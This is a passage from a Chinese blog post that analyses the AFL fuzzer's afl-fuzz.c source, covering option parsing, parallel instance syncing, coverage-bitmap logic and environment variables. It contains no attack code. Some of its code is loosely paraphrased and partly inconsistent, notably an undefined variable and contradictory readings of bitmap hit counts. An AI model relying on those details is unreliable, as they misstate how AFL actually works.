once or twice to get variants of a particular</span></span><br><span class="line"><span class="comment">     file, so I&#x27;m not making this an official setting. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_bitmap) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -B options not supported&quot;</span>);</span><br><span class="line"></span><br><span class="line">  in_bitmap = optarg;</span><br><span class="line">  <span class="built_in">read_bitmap</span>(in_bitmap);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>: <span class="comment">/* crash mode */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (crash_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -C options not supported&quot;</span>);</span><br><span class="line">  crash_mode = FAULT_CRASH;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>: <span class="comment">/* dumb mode */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -n options not supported&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_DUMB_FORKSRV&quot;</span>)) dumb_mode = <span class="number">2</span>; <span class="keyword">else</span> dumb_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>: <span class="comment">/* banner */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (use_banner) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -T options not supported&quot;</span>);</span><br><span class="line">  use_banner = optarg;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;Q&#x27;</span>: <span class="comment">/* QEMU mode */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (qemu_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -Q options not supported&quot;</span>);</span><br><span class="line">  qemu_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!mem_limit_given) mem_limit = MEM_LIMIT_QEMU;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span>: <span class="comment">/* Show version number */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Version number has been printed already, just quit. */</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"></span><br><span class="line">  <span class="built_in">usage</span>(argv[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>支持的主要选项：</p><table><thead><tr><th align="left">选项</th><th align="left">参数</th><th align="left">功能</th><th align="left">重要性</th></tr></thead><tbody><tr><td align="left">-i</td><td align="left">目录</td><td align="left">输入测试用例目录</td><td align="left">必需</td></tr><tr><td align="left">-o</td><td align="left">目录</td><td align="left">输出结果目录</td><td align="left">必需</td></tr><tr><td align="left">-f</td><td align="left">文件</td><td align="left">目标程序输入文件</td><td align="left">可选</td></tr><tr><td align="left">-m</td><td align="left">内存</td><td align="left">内存限制</td><td align="left">重要</td></tr><tr><td align="left">-t</td><td align="left">时间</td><td align="left">执行超时</td><td align="left">重要</td></tr><tr><td align="left">-M&#x2F;-S</td><td align="left">ID</td><td align="left">主&#x2F;从同步模式</td><td align="left">并行</td></tr><tr><td align="left">-x</td><td align="left">目录</td><td align="left">字典目录</td><td align="left">优化</td></tr><tr><td align="left">-Q</td><td align="left">-</td><td align="left">QEMU模式</td><td align="left">特殊</td></tr><tr><td align="left">-C</td><td align="left">-</td><td align="left">崩溃模式</td><td align="left">调试</td></tr><tr><td align="left">-n</td><td align="left">-</td><td align="left">哑模式</td><td align="left">特殊</td></tr><tr><td align="left">-B</td><td align="left">bitmap</td><td align="left">基于已有覆盖率</td><td align="left"></td></tr></tbody></table><blockquote><p><code>extern char *optarg;</code></p><p><code>optarg</code>定义在<code>&lt;unistd.h&gt;</code>头文件中，由 <code>getopt()</code> 函数维护，当 <code>getopt()</code> 解析到一个需要参数的选项时，会将该参数的地址赋值给 <code>optarg</code>，例如此时有<code>-i /tmp/test</code>这个选项，如果getopt的第三个参数有<code>i:</code>的话，那么此时<code>*optarg=&quot;/tmp/test&quot;</code>😎</p></blockquote><h4 id="“M”-“S”选项"><a href="#“M”-“S”选项" class="headerlink" title="“M” &amp; “S”选项"></a>“M” &amp; “S”选项</h4><p>可以看到是主&#x2F;从同步模式，afl-fuzz的单个fuzzer只占用一个进程，因此只能占用一个核心，而在多核系统中可以同时运行多个fuzzer实例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动主实例</span></span><br><span class="line">./afl-fuzz -i input -o sync_dir -M fuzzer01 ./target @@</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动从实例</span></span><br><span class="line">./afl-fuzz -i input -o sync_dir -S fuzzer02 ./target @@</span><br><span class="line">./afl-fuzz -i input -o sync_dir -S fuzzer03 ./target @@</span><br></pre></td></tr></table></figure><p>实例与实例之间的共享方式是通过将信息输入到同一个文件夹下，每个fuzzer周期性的check文件夹下其他fuzzer生成的用例，将有用的用例加入到自己的用例集中，这里可以详细分析一下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sync_dir/</span><br><span class="line">├── fuzzer01/           # 主实例 (-M)</span><br><span class="line">│   ├── queue/          # 测试用例队列</span><br><span class="line">│   ├── crashes/        # 崩溃样本</span><br><span class="line">│   ├── hangs/         # 挂起样本</span><br><span class="line">│   └── .synced/       # 同步状态记录</span><br><span class="line">│       ├── fuzzer02   # 记录从fuzzer02同步到的位置</span><br><span class="line">│       └── fuzzer03   # 记录从fuzzer03同步到的位置</span><br><span class="line">├── fuzzer02/          # 从实例 (-S)</span><br><span class="line">│   ├── queue/</span><br><span class="line">│   └── .synced/</span><br><span class="line">└── fuzzer03/          # 从实例 (-S)</span><br><span class="line">    ├── queue/</span><br><span class="line">    └── .synced/</span><br></pre></td></tr></table></figure><p>目录结构大致会是这样的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 主循环中的同步调用</span></span><br><span class="line"><span class="keyword">if</span> (!stop_soon &amp;&amp; sync_id &amp;&amp; !skipped_fuzz) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(sync_interval_cnt++ % SYNC_INTERVAL))</span><br><span class="line">        <span class="built_in">sync_fuzzers</span>(use_argv);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYNC_INTERVAL 5  <span class="comment">// 每5次fuzz_one()调用后同步一次</span></span></span><br></pre></td></tr></table></figure><p>可以看到同步时机是5次</p><h5 id="sync-fuzzers"><a href="#sync-fuzzers" class="headerlink" title="sync_fuzzers"></a>sync_fuzzers</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">sync_fuzzers</span><span class="params">(<span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    DIR* sd;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">dirent</span>* sd_ent;</span><br><span class="line">    u32 sync_cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 打开同步目录</span></span><br><span class="line">    sd = <span class="built_in">opendir</span>(sync_dir);</span><br><span class="line">    <span class="keyword">if</span> (!sd) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, sync_dir);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 遍历同步目录中的所有fuzzer实例</span></span><br><span class="line">    <span class="keyword">while</span> ((sd_ent = <span class="built_in">readdir</span>(sd))) &#123;</span><br><span class="line">        <span class="comment">// 跳过自己和隐藏文件</span></span><br><span class="line">        <span class="keyword">if</span> (sd_ent-&gt;d_name[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span> || !<span class="built_in">strcmp</span>(sync_id, sd_ent-&gt;d_name)) </span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 检查是否有queue子目录</span></span><br><span class="line">        qd_path = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/%s/queue&quot;</span>, sync_dir, sd_ent-&gt;d_name);</span><br><span class="line">        <span class="keyword">if</span> (!(qd = <span class="built_in">opendir</span>(qd_path))) &#123;</span><br><span class="line">            <span class="built_in">ck_free</span>(qd_path);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 读取同步状态</span></span><br><span class="line">        qd_synced_path = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/.synced/%s&quot;</span>, out_dir, sd_ent-&gt;d_name);</span><br><span class="line">        id_fd = <span class="built_in">open</span>(qd_synced_path, O_RDWR | O_CREAT, <span class="number">0600</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 读取上次同步到的测试用例ID</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">read</span>(id_fd, &amp;min_accept, <span class="built_in">sizeof</span>(u32)) &gt; <span class="number">0</span>) </span><br><span class="line">            <span class="built_in">lseek</span>(id_fd, <span class="number">0</span>, SEEK_SET);</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 遍历其他fuzzer的队列文件</span></span><br><span class="line"><span class="keyword">while</span> ((qd_ent = <span class="built_in">readdir</span>(qd))) &#123;</span><br><span class="line">    <span class="comment">// 解析文件名，提取用例ID</span></span><br><span class="line">    <span class="keyword">if</span> (qd_ent-&gt;d_name[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span> ||</span><br><span class="line">        <span class="built_in">sscanf</span>(qd_ent-&gt;d_name, CASE_PREFIX <span class="string">&quot;%06u&quot;</span>, &amp;syncing_case) != <span class="number">1</span> || </span><br><span class="line">        syncing_case &lt; min_accept) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只处理新的测试用例</span></span><br><span class="line">    <span class="keyword">if</span> (syncing_case &gt;= next_min_accept)</span><br><span class="line">        next_min_accept = syncing_case + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    path = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/%s&quot;</span>, qd_path, qd_ent-&gt;d_name);</span><br><span class="line">    fd = <span class="built_in">open</span>(path, O_RDONLY);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">ck_free</span>(path);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取测试用例内容</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fstat</span>(fd, &amp;st)) <span class="built_in">PFATAL</span>(<span class="string">&quot;fstat() failed&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (st.st_size &amp;&amp; st.st_size &lt;= MAX_FILE) &#123;</span><br><span class="line">        u8* mem = <span class="built_in">mmap</span>(<span class="number">0</span>, st.st_size, PROT_READ, MAP_PRIVATE, fd, <span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 执行测试用例</span></span><br><span class="line">        <span class="built_in">write_to_testcase</span>(mem, st.st_size);</span><br><span class="line">        fault = <span class="built_in">run_target</span>(argv, exec_tmout);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 检查是否有趣并保存</span></span><br><span class="line">        syncing_party = sd_ent-&gt;d_name;</span><br><span class="line">        queued_imported += <span class="built_in">save_if_interesting</span>(argv, mem, st.st_size, fault);</span><br><span class="line">        syncing_party = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">munmap</span>(mem, st.st_size);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新同步状态</span></span><br><span class="line"><span class="built_in">ck_write</span>(id_fd, &amp;next_min_accept, <span class="built_in">sizeof</span>(u32), qd_synced_path);</span><br></pre></td></tr></table></figure><p>可以看到，保留用例来自于<code>save_if_interesting</code>函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> u8 <span class="title">save_if_interesting</span><span class="params">(<span class="type">char</span>** argv, <span class="type">void</span>* mem, u32 len, u8 fault)</span> </span>&#123;</span><br><span class="line">    u8 hnb;</span><br><span class="line">    u8 keeping = <span class="number">0</span>, res;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fault == crash_mode) &#123;</span><br><span class="line">        <span class="comment">// 关键：检查是否有新的覆盖率位</span></span><br><span class="line">        <span class="keyword">if</span> (!(hnb = <span class="built_in">has_new_bits</span>(virgin_bits))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (crash_mode) total_crashes++;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// 没有新覆盖率，不保存</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 有新覆盖率，保存到队列</span></span><br><span class="line">        <span class="built_in">add_to_queue</span>(fn, len, <span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (hnb == <span class="number">2</span>) &#123;</span><br><span class="line">            queue_top-&gt;has_new_cov = <span class="number">1</span>;  <span class="comment">// 标记为有新覆盖率</span></span><br><span class="line">            queued_with_cov++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        keeping = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> keeping;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> u8 <span class="title">has_new_bits</span><span class="params">(u8* virgin_map)</span> </span>&#123;</span><br><span class="line">    u64* current = (u64*)trace_bits;    <span class="comment">// 当前执行的覆盖率</span></span><br><span class="line">    u64* virgin  = (u64*)virgin_map;    <span class="comment">// 全局virgin位图</span></span><br><span class="line">    u32  i = (MAP_SIZE &gt;&gt; <span class="number">3</span>);</span><br><span class="line">    u8   ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i--) &#123;</span><br><span class="line">        <span class="comment">// 检查当前执行是否触及了virgin位图中的新位</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">unlikely</span>(*current) &amp;&amp; <span class="built_in">unlikely</span>(*current &amp; *virgin)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">likely</span>(ret &lt; <span class="number">2</span>)) &#123;</span><br><span class="line">                u8* cur = (u8*)current;</span><br><span class="line">                u8* vir = (u8*)virgin;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 检查是否有完全新的路径 (virgin位为0xff)</span></span><br><span class="line">                <span class="keyword">if</span> ((cur[<span class="number">0</span>] &amp;&amp; vir[<span class="number">0</span>] == <span class="number">0xff</span>) || (cur[<span class="number">1</span>] &amp;&amp; vir[<span class="number">1</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">                    (cur[<span class="number">2</span>] &amp;&amp; vir[<span class="number">2</span>] == <span class="number">0xff</span>) || (cur[<span class="number">3</span>] &amp;&amp; vir[<span class="number">3</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">                    (cur[<span class="number">4</span>] &amp;&amp; vir[<span class="number">4</span>] == <span class="number">0xff</span>) || (cur[<span class="number">5</span>] &amp;&amp; vir[<span class="number">5</span>] == <span class="number">0xff</span>) ||</span><br><span class="line">                    (cur[<span class="number">6</span>] &amp;&amp; vir[<span class="number">6</span>] == <span class="number">0xff</span>) || (cur[<span class="number">7</span>] &amp;&amp; vir[<span class="number">7</span>] == <span class="number">0xff</span>)) </span><br><span class="line">                    ret = <span class="number">2</span>;  <span class="comment">// 发现新路径</span></span><br><span class="line">                <span class="keyword">else</span> </span><br><span class="line">                    ret = <span class="number">1</span>;  <span class="comment">// 只是命中次数变化</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 更新virgin位图</span></span><br><span class="line">            *virgin &amp;= ~*current;</span><br><span class="line">        &#125;</span><br><span class="line">        current++;</span><br><span class="line">        virgin++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ret=0</code>的话代表没有新覆盖率，<code>ret=1</code>代表发现已知路径的新的命中次数，<code>ret=2</code>代表发现全新的执行路径</p><h4 id="bitmap"><a href="#bitmap" class="headerlink" title="bitmap"></a>bitmap</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_SIZE_POW2       16          <span class="comment">// 2^16 = 65536</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_SIZE            (1 &lt;&lt; MAP_SIZE_POW2)  <span class="comment">// 65536字节</span></span></span><br><span class="line"></span><br><span class="line">EXP_ST u8  virgin_bits[MAP_SIZE],       <span class="comment">// 未触及的覆盖率区域</span></span><br><span class="line">           virgin_tmout[MAP_SIZE],      <span class="comment">// 超时情况下的virgin位图</span></span><br><span class="line">           virgin_crash[MAP_SIZE];      <span class="comment">// 崩溃情况下的virgin位图</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EXP_ST <span class="type">void</span> <span class="title">setup_shm</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 关键：如果没有加载bitmap (-B选项)，则初始化为全1</span></span><br><span class="line">    <span class="keyword">if</span> (!in_bitmap) <span class="built_in">memset</span>(virgin_bits, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(virgin_tmout, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(virgin_crash, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ... 共享内存设置</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Virgin位图的值含义：</span></span><br><span class="line"><span class="comment">// 0xFF (11111111) - 完全未触及的路径</span></span><br><span class="line"><span class="comment">// 0xFE (11111110) - 触及过1次</span></span><br><span class="line"><span class="comment">// 0xFC (11111100) - 触及过1-2次  </span></span><br><span class="line"><span class="comment">// 0xF8 (11111000) - 触及过1-4次</span></span><br><span class="line"><span class="comment">// 0xF0 (11110000) - 触及过1-8次</span></span><br><span class="line"><span class="comment">// 0xE0 (11100000) - 触及过1-16次</span></span><br><span class="line"><span class="comment">// 0xC0 (11000000) - 触及过1-32次</span></span><br><span class="line"><span class="comment">// 0x80 (10000000) - 触及过1-128次</span></span><br><span class="line"><span class="comment">// 0x00 (00000000) - 触及过128+次</span></span><br></pre></td></tr></table></figure><h4 id="Bitmap文件的十六进制示例"><a href="#Bitmap文件的十六进制示例" class="headerlink" title="Bitmap文件的十六进制示例"></a>Bitmap文件的十六进制示例</h4><p>bash</p><p>Apply to afl-fuzz.c</p><p>Run</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">\# 查看bitmap文件内容（前32字节）</span><br><span class="line"></span><br><span class="line">hexdump -C output_dir/fuzz_bitmap | head -5</span><br><span class="line"></span><br><span class="line">00000000 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff |................|</span><br><span class="line"></span><br><span class="line">00000010 ff ff ff fe ff ff fc ff ff f8 ff ff f0 ff ff e0 |................|</span><br><span class="line"></span><br><span class="line">00000020 ff ff c0 ff ff 80 ff ff 00 ff ff ff ff ff ff ff |................|</span><br><span class="line"></span><br><span class="line">00000030 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff |................|</span><br></pre></td></tr></table></figure><p>解读：</p><ul><li><p><code>0x0000-0x000F</code>: 全部为0xFF，表示这些路径完全未被触及</p></li><li><p><code>0x0010: 0xFE</code>，表示这个路径被触及过1次</p></li><li><p><code>0x0012: 0xFC</code>，表示这个路径被触及过2-3次</p></li><li><p><code>0x0014: 0xF8</code>，表示这个路径被触及过4-7次</p></li><li><p>以此类推…</p></li></ul><p>接下来就是一些参数的验证和环境的检查</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 必需参数检查</span></span><br><span class="line"><span class="keyword">if</span> (optind == argc || !in_dir || !out_dir) <span class="built_in">usage</span>(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 信号处理器设置</span></span><br><span class="line"><span class="built_in">setup_signal_handlers</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. ASAN选项检查</span></span><br><span class="line"><span class="built_in">check_asan_opts</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 同步设置</span></span><br><span class="line"><span class="keyword">if</span> (sync_id) <span class="built_in">fix_up_sync</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. 目录冲突检查</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(in_dir, out_dir))</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Input and output directories can&#x27;t be the same&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dumb_mode) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (crash_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;-C and -n are mutually exclusive&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (qemu_mode)  <span class="built_in">FATAL</span>(<span class="string">&quot;-Q and -n are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时dubm模式与crash和qemu模式不兼容</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_FORKSRV&quot;</span>))    no_forkserver    = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_CPU_RED&quot;</span>))    no_cpu_meter_red = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_ARITH&quot;</span>))      no_arith         = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_SHUFFLE_QUEUE&quot;</span>)) shuffle_queue    = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_FAST_CAL&quot;</span>))      fast_cal         = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>重要环境变量：</p><table><thead><tr><th align="left">变量</th><th align="left">功能</th><th align="left">影响</th></tr></thead><tbody><tr><td align="left">AFL_NO_FORKSRV</td><td align="left">禁用fork server</td><td align="left">性能下降</td></tr><tr><td align="left">AFL_NO_CPU_RED</td><td align="left">禁用CPU红色警告</td><td align="left">界面优化</td></tr><tr><td align="left">AFL_NO_ARITH</td><td align="left">禁用算术变异</td><td align="left">策略简化</td></tr><tr><td align="left">AFL_SHUFFLE_QUEUE</td><td align="left">随机化队列顺序</td><td align="left">探索策略</td></tr><tr><td align="left">AFL_FAST_CAL</td><td align="left">快速校准</td><td align="left">启动优化</td></tr></tbody></table><h3 id="系统环境准备和初始化"><a href="#系统环境准备和初始化" class="headerlink" title="系统环境准备和初始化"></a>系统环境准备和初始化</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 